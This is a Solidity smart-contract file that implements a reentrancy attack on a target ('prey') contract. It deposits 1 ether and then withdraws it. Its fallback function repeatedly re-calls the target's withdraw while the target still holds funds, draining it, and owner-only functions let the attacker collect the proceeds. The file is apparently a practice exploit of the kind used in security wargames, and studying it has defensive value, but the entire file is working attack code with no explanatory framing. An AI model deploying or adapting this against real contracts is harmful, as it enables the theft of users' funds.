// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
contract Reentrance is Ownable{
    address public preyAddr;

    constructor(address _preyAddrAddress) {
        preyAddr = _preyAddrAddress;
    }

    // Fallback is called when preyAddr sends Ether to this contract.
    fallback() external payable {
        if (address(preyAddr).balance >= 1 ether) {
            (bool success,) = preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        }
        
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        (bool success1,) = preyAddr.call{value: 1 ether}(abi.encodeWithSignature("deposit()")); 
        require(success1, "attack function, failed to deposit");
        (bool success2,) = preyAddr.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        require(success2, "attack function, failed to withdraw");
    }

    // Helper function to check the balance of this contract
    function getBalance() onlyOwner external view returns (uint) {
        return address(this).balance;
    }

    function setPreyAddre(address addr) onlyOwner external {
        preyAddr = addr;
    }

    // 提取款项
    function withdraw(uint amount) onlyOwner external {
        if (amount < address(this).balance){
            payable(msg.sender).transfer(amount);
        }
    }
}
